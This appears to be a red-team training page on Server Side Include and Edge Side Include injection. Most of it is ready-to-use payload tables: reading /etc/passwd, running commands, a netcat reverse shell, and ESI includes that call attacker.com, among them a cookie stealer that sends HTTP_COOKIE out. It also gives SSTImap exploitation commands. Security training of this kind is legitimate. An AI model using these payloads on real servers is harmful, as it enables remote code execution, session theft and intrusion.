---
layout: training-page
title: "Server Side Include Injection — Red Team Academy"
module: "Web Hacking"
tags:
  - ssi
  - esi
  - server-side-include
  - rce
  - web
page_key: "web-ssi-injection"
render_with_liquid: false
---

# Server Side Include Injection

Server Side Includes (SSI) are directives embedded in HTML pages and processed by the web server before the page is sent to the client. They can include files, execute commands, and print environment variables. SSI Injection occurs when unsanitized user input reaches an SSI context, allowing an attacker to execute arbitrary commands on the server.

## SSI Directive Format

```
<!--#directive param="value" -->
```

SSI is commonly enabled on Apache and IIS for files with `.shtml`, `.shtm`, or `.stm` extensions, though some configurations apply it to all `.html` files.

## SSI Injection Payloads

| Description | Payload |
| --- | --- |
| Print the date | `<!--#echo var="DATE_LOCAL" -->` |
| Print the document name | `<!--#echo var="DOCUMENT_NAME" -->` |
| Print all environment variables | `<!--#printenv -->` |
| Set a variable | `<!--#set var="name" value="Rich" -->` |
| Include a file | `<!--#include file="/etc/passwd" -->` |
| Include a virtual path | `<!--#include virtual="/index.html" -->` |
| Execute a command | `<!--#exec cmd="ls" -->` |
| Reverse shell | `<!--#exec cmd="mkfifo /tmp/f;nc IP PORT 0</tmp/f\|/bin/bash 1>/tmp/f;rm /tmp/f" -->` |

## Detection and Exploitation with SSTImap

SSTImap detects and exploits SSTI and SSI injection with its `--legacy` flag or `-e SSI` engine selector:

```
# Basic detection via GET parameter
python3 ./sstimap.py -u 'https://example.com/page?name=John' --legacy -s

# Interactive mode targeting a vulnerable parameter with SSI engine
python3 ./sstimap.py -i -u 'https://example.com/page?name=Vulnerable*&message=My_message' -l 5 -e SSI

# POST request with basic auth
python3 ./sstimap.py -i --legacy -A -m POST -l 5 -H 'Authorization: Basic bG9naW46c2VjcmV0X3Bhc3N3b3Jk'
```

## Edge Side Inclusion (ESI) Injection

Edge Side Includes (ESI) are an XML-based markup language used by HTTP caching proxies (Varnish, Squid, Fastly, Akamai) to assemble web pages from multiple fragments. Caching surrogates cannot distinguish legitimate ESI tags from attacker-injected ones in the HTTP response body, making them a powerful injection vector.

Some surrogates require ESI to be enabled via the response header:

```
Surrogate-Control: content="ESI/1.0"
```

### ESI Injection Payloads

| Description | Payload |
| --- | --- |
| Blind detection (SSRF) | `<esi:include src=http://attacker.com>` |
| XSS via remote include | `<esi:include src=http://attacker.com/XSSPAYLOAD.html>` |
| Cookie stealer | `<esi:include src=http://attacker.com/steal.php?c=$(HTTP_COOKIE)>` |
| Include local file | `<esi:include src="supersecret.txt">` |
| Display debug info | `<esi:debug/>` |
| Add redirect header | `<!--esi $add_header('Location','http://attacker.com') -->` |
| Inline XSS fragment | `<esi:inline name="/attack.html" fetchable="yes"><script>prompt('XSS')</script></esi:inline>` |

### ESI Feature Support by Surrogate

| Software | Includes | Vars | Cookies | Upstream Header Required | Host Whitelist |
| --- | --- | --- | --- | --- | --- |
| Squid3 | Yes | Yes | Yes | Yes | No |
| Varnish Cache | Yes | No | No | Yes | Yes |
| Fastly | Yes | No | No | No | Yes |
| Akamai ESI Test Server | Yes | Yes | Yes | No | No |
| Node.js esi | Yes | Yes | Yes | No | No |
| Node.js nodesi | Yes | No | No | No | Optional |

## Tools

- [vladko312/SSTImap](https://github.com/vladko312/SSTImap) — Automatic SSTI/SSI detection and exploitation tool

## Resources

- Beyond XSS: Edge Side Include Injection — Louis Dion-Marcil — `gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection`
- ESI Injection Part 2: Abusing Specific Implementations — Philippe Arteau — `gosecure.ai/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations`
- Exploiting Server Side Include Injection — n00py — `n00py.io/2017/08/exploiting-server-side-include-injection/`
- Server-Side Includes (SSI) Injection — OWASP — `owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection`
- DEF CON 26 — Edge Side Include Injection Abusing Caching Servers into SSRF — ldionmarcil
